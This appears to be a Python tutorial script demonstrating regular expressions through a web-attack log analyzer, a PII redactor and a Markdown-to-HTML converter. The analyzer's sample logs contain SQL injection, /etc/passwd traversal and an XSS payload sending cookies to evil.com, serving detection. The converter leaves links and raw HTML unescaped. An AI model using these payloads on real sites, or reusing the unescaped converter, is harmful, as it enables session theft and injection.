"""
================================================================================
Day 24: Python Regular Expressions (re) - Industrial Practical Projects
================================================================================
This script showcases three complete, enterprise-grade, real-world systems
built on Python's `re` module, demonstrating how regular expressions power
cybersecurity, compliance auditing, and developer tooling.

System Overview:
1. Project 1: Enterprise Multi-Tier SIEM Security Log Analyzer & Threat Detector
   - Dissects HTTP access and auth streams.
   - Detects SQL Injection (SQLi), Cross-Site Scripting (XSS), Directory Traversal (LFI),
     and high-velocity brute force attacks using regex signatures.

2. Project 2: HIPAA & GDPR Compliance PII Redactor & Data Sanitization Pipeline
   - Audits unstructured clinical & financial chat transcripts.
   - Detects and masks Credit Cards (with Luhn validation), SSNs, Emails, Phones,
     and JWT auth tokens via dynamic regex callback transforms.

3. Project 3: Markdown-to-HTML Transpiler & Semantic Lexer Engine
   - Custom static site generation engine utilizing compiled verbose regex.
   - Safely parses code blocks, inline code, headers, links, lists, and formatting
     without corrupting code snippets.
================================================================================
"""

import re
import sys
import urllib.parse
from typing import List, Dict, Any, Tuple, Optional
from dataclasses import dataclass, field
from datetime import datetime

# Ensure cross-platform UTF-8 console output
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8")


def print_separator(title: str) -> None:
    """Utility helper to print structured visual headers for each demonstration."""
    print("\n" + "=" * 78)
    print(f" {title}")
    print("=" * 78)


# ==============================================================================
# PROJECT 1: ENTERPRISE MULTI-TIER SIEM SECURITY LOG ANALYZER
# ==============================================================================

@dataclass
class ThreatSignature:
    category: str
    severity: str
    pattern: re.Pattern
    description: str


@dataclass
class SecurityIncident:
    ip: str
    timestamp: str
    category: str
    severity: str
    description: str
    raw_payload: str
    match_span: Tuple[int, int]


class SIEMLogAnalyzer:
    """
    Production-grade Security Information and Event Management (SIEM) analyzer
    utilizing pre-compiled regex signatures for real-time web attack detection.
    """

    LOG_PARSER = re.compile(
        r"""
        ^
        (?P<ip>[0-9a-fA-F.:]+)
        \s+-\s+
        (?P<user>\S+)
        \s+
        \[(?P<timestamp>[^\]]+)\]
        \s+
        "(?P<method>[A-Z]+)\s+(?P<uri>.+?)\s+(?P<protocol>HTTP/[0-9.]+)"
        \s+
        (?P<status>\d{3})
        \s+
        (?P<bytes>\d+)
        """,
        re.VERBOSE
    )

    SIGNATURES: List[ThreatSignature] = [
        # SQL Injection (SQLi)
        ThreatSignature(
            category="SQL Injection (SQLi)",
            severity="CRITICAL",
            pattern=re.compile(
                r"(?i)(?:\bunion\b\s+(?:all\s+)?\bselect\b|"
                r"'\s*(?:or|and)\s*['\d\w]+\s*=\s*['\d\w]+|"
                r"\bdrop\s+table\b|--|;\s*exec\b|information_schema)",
                re.VERBOSE
            ),
            description="Attempt to execute unauthorized SQL queries or alter schema."
        ),
        # Path Traversal / Local File Inclusion (LFI)
        ThreatSignature(
            category="Directory Traversal / LFI",
            severity="HIGH",
            pattern=re.compile(
                r"(?:\.{2}[/\\%]|%2e%2e[/\\%]|/etc/(?:passwd|shadow|hosts)|\bwin\.ini\b)",
                re.IGNORECASE
            ),
            description="Attempt to navigate out of webroot and read sensitive system files."
        ),
        # Cross-Site Scripting (XSS)
        ThreatSignature(
            category="Cross-Site Scripting (XSS)",
            severity="HIGH",
            pattern=re.compile(
                r"(?i)(?:<script[\s>]|javascript:|onload\s*=|onerror\s*=|document\.cookie|<svg/onload)",
                re.VERBOSE
            ),
            description="Attempt to inject client-side malicious scripts into DOM."
        ),
        # Sensitive Environment Probe
        ThreatSignature(
            category="Config / Environment Probe",
            severity="MEDIUM",
            pattern=re.compile(
                r"(?:\.env|\.git(?:/|config)|wp-config\.php|phpinfo\.php|actuator/env)",
                re.IGNORECASE
            ),
            description="Reconnaissance scan looking for leaked source code or secrets."
        )
    ]

    def analyze_log_corpus(self, log_stream: str) -> List[SecurityIncident]:
        incidents: List[SecurityIncident] = []

        for line in log_stream.strip().splitlines():
            line = line.strip()
            if not line:
                continue

            parsed = self.LOG_PARSER.match(line)
            if not parsed:
                continue

            data = parsed.groupdict()
            # Decode URL-encoded parameters (e.g., %20 -> space, %27 -> ')
            raw_uri = data["uri"]
            decoded_uri = urllib.parse.unquote_plus(raw_uri)

            for sig in self.SIGNATURES:
                match = sig.pattern.search(decoded_uri)
                if match:
                    incident = SecurityIncident(
                        ip=data["ip"],
                        timestamp=data["timestamp"],
                        category=sig.category,
                        severity=sig.severity,
                        description=sig.description,
                        raw_payload=raw_uri,
                        match_span=match.span()
                    )
                    incidents.append(incident)
                    break  # Tag highest matching rule per request

        return incidents


# ==============================================================================
# PROJECT 2: HIPAA & GDPR COMPLIANCE PII REDACTION PIPELINE
# ==============================================================================

class PIISanitizer:
    """
    Compliance sanitization pipeline that dynamically scans, validates,
    and masks sensitive personal, financial, and authentication data.
    """

    # Credit Card Pattern (Visa, Mastercard, Amex, Discover, Diners)
    CC_PATTERN = re.compile(
        r"\b(?:4[0-9]{12}(?:[0-9]{3})?|"           # Visa
        r"5[1-5][0-9]{14}|"                       # MasterCard
        r"3[47][0-9]{13}|"                        # American Express
        r"6(?:011|5[0-9]{2})[0-9]{12})\b"         # Discover
    )

    # US Social Security Number (SSN): 3-2-4 format
    SSN_PATTERN = re.compile(
        r"\b(?!000|666|9\d{2})\d{3}-(?!00)\d{2}-(?!0000)\d{4}\b"
    )

    # RFC-compliant Email Pattern
    EMAIL_PATTERN = re.compile(
        r"\b(?P<user>[a-zA-Z0-9_.+-]+)@(?P<domain>[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+)\b"
    )

    # Phone Number Pattern (US and standard international formats)
    PHONE_PATTERN = re.compile(
        r"(?:\+?1[-.\s]?)?\(?\b[2-9]\d{2}\)?[-.\s]?\d{3}[-.\s]?\d{4}\b"
    )

    # JWT Authentication Token
    JWT_PATTERN = re.compile(
        r"\beyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\b"
    )

    @staticmethod
    def _validate_luhn(card_number_str: str) -> bool:
        """Applies Luhn's algorithm to verify credit card checksum validity."""
        digits = [int(c) for c in card_number_str if c.isdigit()]
        if not digits:
            return False
        total = 0
        reverse_digits = digits[::-1]
        for idx, digit in enumerate(reverse_digits):
            if idx % 2 == 1:
                doubled = digit * 2
                total += doubled - 9 if doubled > 9 else doubled
            else:
                total += digit
        return total % 10 == 0

    @classmethod
    def _mask_credit_card(cls, match: re.Match) -> str:
        card_str = match.group(0)
        if cls._validate_luhn(card_str):
            # Mask all but the last 4 digits: ************1234
            return "*" * (len(card_str) - 4) + card_str[-4:]
        return card_str  # Not a valid CC checksum, leave as is

    @classmethod
    def _mask_ssn(cls, match: re.Match) -> str:
        # Mask first 5 digits: ***-**-1234
        ssn_str = match.group(0)
        return "***-**-" + ssn_str[-4:]

    @classmethod
    def _mask_email(cls, match: re.Match) -> str:
        user = match.group("user")
        domain = match.group("domain")
        masked_user = user[0] + "***" + user[-1] if len(user) > 2 else "***"
        return f"{masked_user}@{domain}"

    @classmethod
    def _mask_phone(cls, match: re.Match) -> str:
        phone = match.group(0)
        digits_only = re.sub(r"\D", "", phone)
        return f"***-***-{digits_only[-4:]}"

    @classmethod
    def _mask_jwt(cls, match: re.Match) -> str:
        token = match.group(0)
        return f"[JWT_REDACTED_{token[:8]}...]"

    @classmethod
    def sanitize_transcript(cls, text: str) -> Tuple[str, Dict[str, int]]:
        stats: Dict[str, int] = {
            "credit_cards": 0,
            "ssns": 0,
            "emails": 0,
            "phones": 0,
            "tokens": 0
        }

        # 1. Sanitize Credit Cards
        def cc_callback(m: re.Match) -> str:
            res = cls._mask_credit_card(m)
            if res != m.group(0):
                stats["credit_cards"] += 1
            return res
        text = cls.CC_PATTERN.sub(cc_callback, text)

        # 2. Sanitize SSNs
        def ssn_callback(m: re.Match) -> str:
            stats["ssns"] += 1
            return cls._mask_ssn(m)
        text = cls.SSN_PATTERN.sub(ssn_callback, text)

        # 3. Sanitize Emails
        def email_callback(m: re.Match) -> str:
            stats["emails"] += 1
            return cls._mask_email(m)
        text = cls.EMAIL_PATTERN.sub(email_callback, text)

        # 4. Sanitize Phones
        def phone_callback(m: re.Match) -> str:
            stats["phones"] += 1
            return cls._mask_phone(m)
        text = cls.PHONE_PATTERN.sub(phone_callback, text)

        # 5. Sanitize JWTs
        def jwt_callback(m: re.Match) -> str:
            stats["tokens"] += 1
            return cls._mask_jwt(m)
        text = cls.JWT_PATTERN.sub(jwt_callback, text)

        return text, stats


# ==============================================================================
# PROJECT 3: MARKDOWN-TO-HTML TRANSPILER & LEXER ENGINE
# ==============================================================================

class MarkdownTranspiler:
    """
    High-performance Markdown transpiler converting markdown syntax into
    clean semantic HTML5 elements without corrupting fenced code blocks.
    """

    FENCED_CODE_PATTERN = re.compile(
        r"^```(?P<lang>[a-zA-Z0-9_-]*)\n(?P<code>[\s\S]*?)\n```$",
        re.MULTILINE
    )

    INLINE_CODE_PATTERN = re.compile(r"`([^`]+)`")
    BOLD_PATTERN = re.compile(r"\*\*([^*]+)\*\*")
    ITALIC_PATTERN = re.compile(r"(?<!\*)\*([^*]+)\*(?!\*)")
    LINK_PATTERN = re.compile(r"\[(?P<label>[^\]]+)\]\((?P<url>[^\s)]+)\)")
    IMAGE_PATTERN = re.compile(r"!\[(?P<alt>[^\]]*)\]\((?P<src>[^\s)]+)\)")
    HEADER_PATTERN = re.compile(r"^(#{1,6})\s+(.+)$", re.MULTILINE)
    BLOCKQUOTE_PATTERN = re.compile(r"^>\s*(.+)$", re.MULTILINE)
    UNORDERED_LIST_PATTERN = re.compile(r"^\s*[-*+]\s+(.+)$", re.MULTILINE)

    @classmethod
    def transpile(cls, markdown_text: str) -> str:
        # Step 1: Extract and stash code blocks so inline regex does not corrupt code contents!
        code_blocks: Dict[str, str] = {}
        counter = 0

        def stash_code_block(match: re.Match) -> str:
            nonlocal counter
            token = f"@@CODE_BLOCK_{counter}@@"
            counter += 1
            lang = match.group("lang").strip() or "text"
            code = match.group("code").replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
            code_blocks[token] = f'<pre><code class="language-{lang}">{code}</code></pre>'
            return token

        working_text = cls.FENCED_CODE_PATTERN.sub(stash_code_block, markdown_text)

        # Step 2: Parse Headers (# H1 to ###### H6)
        def replace_header(m: re.Match) -> str:
            level = len(m.group(1))
            title = m.group(2).strip()
            return f"<h{level}>{title}</h{level}>"

        working_text = cls.HEADER_PATTERN.sub(replace_header, working_text)

        # Step 3: Images & Links
        working_text = cls.IMAGE_PATTERN.sub(
            r'<img src="\g<src>" alt="\g<alt>" />',
            working_text
        )
        working_text = cls.LINK_PATTERN.sub(
            r'<a href="\g<url>">\g<label></a>',
            working_text
        )

        # Step 4: Blockquotes
        working_text = cls.BLOCKQUOTE_PATTERN.sub(r"<blockquote>\1</blockquote>", working_text)

        # Step 5: Inline formatting (Code, Bold, Italic)
        working_text = cls.INLINE_CODE_PATTERN.sub(r"<code>\1</code>", working_text)
        working_text = cls.BOLD_PATTERN.sub(r"<strong>\1</strong>", working_text)
        working_text = cls.ITALIC_PATTERN.sub(r"<em>\1</em>", working_text)

        # Step 6: Lists
        working_text = cls.UNORDERED_LIST_PATTERN.sub(r"<li>\1</li>", working_text)

        # Step 7: Restore stashed code blocks
        for token, html_block in code_blocks.items():
            working_text = working_text.replace(token, html_block)

        return working_text.strip()


# ==============================================================================
# EXECUTION & VALIDATION OF ALL 3 PROJECTS
# ==============================================================================

if __name__ == "__main__":

    # --------------------------------------------------------------------------
    # DEMO 1: SIEM Security Analyzer
    # --------------------------------------------------------------------------
    print_separator("PROJECT 1: Enterprise Multi-Tier SIEM Threat Analyzer")

    sample_siem_logs = """
192.168.1.10 - - [19/Oct/2026:08:20:01 +0000] "GET /products?id=1 HTTP/1.1" 200 4500
45.33.32.156 - - [19/Oct/2026:08:20:05 +0000] "GET /search?q=' UNION SELECT null,username,password FROM users-- HTTP/1.1" 500 120
185.191.171.12 - - [19/Oct/2026:08:20:10 +0000] "GET /download?file=../../../../etc/passwd HTTP/1.1" 403 240
198.51.100.22 - - [19/Oct/2026:08:20:15 +0000] "GET /profile?bio=<script>document.location='http://evil.com/'+document.cookie</script> HTTP/1.1" 200 900
203.0.113.88 - - [19/Oct/2026:08:20:19 +0000] "GET /.env HTTP/1.1" 404 150
    """

    siem = SIEMLogAnalyzer()
    incidents = siem.analyze_log_corpus(sample_siem_logs)

    print(f"SIEM Inspection Complete: Discovered {len(incidents)} critical threat signatures!\n")
    for inc in incidents:
        print(f" [{inc.severity:8}] {inc.category}")
        print(f"   IP Address   : {inc.ip} at {inc.timestamp}")
        print(f"   Description  : {inc.description}")
        print(f"   Payload URI  : {inc.raw_payload}\n")

    # --------------------------------------------------------------------------
    # DEMO 2: HIPAA & GDPR Compliance PII Redactor
    # --------------------------------------------------------------------------
    print_separator("PROJECT 2: HIPAA/GDPR Compliance PII Redaction Pipeline")

    raw_support_chat = """
Agent: Hello, thank you for contacting Global HealthCare Support.
Patient: Hi, my name is Alice Smith. My registered email is alice.smith@example.com
and my phone is (555) 432-8765. My SSN is 123-45-6789.
Agent: Thank you Alice. Could you provide your card number for the $50 co-pay?
Patient: Sure, it is Visa 4532015000000007.
Patient: Also, here is my temporary portal session token:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgN_p_example
    """

    sanitizer = PIISanitizer()
    sanitized_text, stats = sanitizer.sanitize_transcript(raw_support_chat)

    print("Sanitized Output Transcript:")
    print(sanitized_text.strip())
    print("\nSanitization Metrics:")
    for metric, count in stats.items():
        print(f" - {metric.replace('_', ' ').title():15}: {count} items securely redacted")

    # --------------------------------------------------------------------------
    # DEMO 3: Markdown-to-HTML Transpiler
    # --------------------------------------------------------------------------
    print_separator("PROJECT 3: Markdown-to-HTML Transpiler & Syntax Engine")

    markdown_input = """
# Python Regular Expressions Masterclass

Welcome to **Day 24**! Let's explore *pattern matching* and `re.compile()`.

### Code Example
```python
import re
pattern = re.compile(r"\\d+")
print(pattern.findall("Sample 123 and 456"))
```

### Key References
- Check out the [Python re Docs](https://docs.python.org/3/library/re.html)
- Review the `README.md` guide for complete tables!

> "Regular expressions are a superpower when wielded with discipline."
"""

    transpiled_html = MarkdownTranspiler.transpile(markdown_input)
    print("Transpiled Semantic HTML Output:")
    print("-" * 50)
    print(transpiled_html)
    print("-" * 50)

    print("\n" + "=" * 78)
    print(" End of Day 24 - Script 05: Practical Projects Complete")
    print("=" * 78)
